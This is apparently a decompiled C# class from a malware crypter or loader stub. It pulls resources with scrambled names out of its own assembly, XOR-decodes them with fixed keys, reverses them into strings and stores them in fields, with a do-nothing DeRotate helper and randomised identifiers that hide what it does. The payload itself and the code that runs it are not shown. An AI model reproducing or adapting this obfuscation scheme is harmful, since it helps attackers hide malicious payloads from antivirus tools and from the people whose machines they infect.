using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class YesSir
{
	public static string kek = Strings.StrReverse(Encoding.Default.GetString((byte[])DeCrypt((byte[])new ResourceManager(Conversions.ToString(DeRotate("edwgchtnm")), Assembly.GetExecutingAssembly()).GetObject(Conversions.ToString(DeRotate("edwgcjrqd"))), Conversions.ToInteger(DeRotate("37")))));

	public static byte[] pByte = (byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(DeRotate("0")) }, (string[])null, (Type[])null, (bool[])null);

	public static byte[] wByte = (byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(DeRotate("edwgchioz")) }, (string[])null, (Type[])null, (bool[])null);

	public static string pObj = Strings.StrReverse(Encoding.Default.GetString((byte[])DeCrypt((byte[])new ResourceManager(Conversions.ToString(DeRotate("edwgcznyg")), Assembly.GetExecutingAssembly()).GetObject(Conversions.ToString(DeRotate("edwgcmelf"))), Conversions.ToInteger(DeRotate("9")))));

	public static object DeCrypt(byte[] edwgcldkeg, int edwgcrgliq)
	{
		int num = edwgcldkeg.Length - 1;
		for (int i = 0; i <= num; i += 18)
		{
			edwgcldkeg[i] = (byte)(edwgcldkeg[i] ^ edwgcrgliq);
		}
		return edwgcldkeg;
	}

	public static object DeRotate(string edwgcpcmyu)
	{
		return edwgcpcmyu;
	}
}
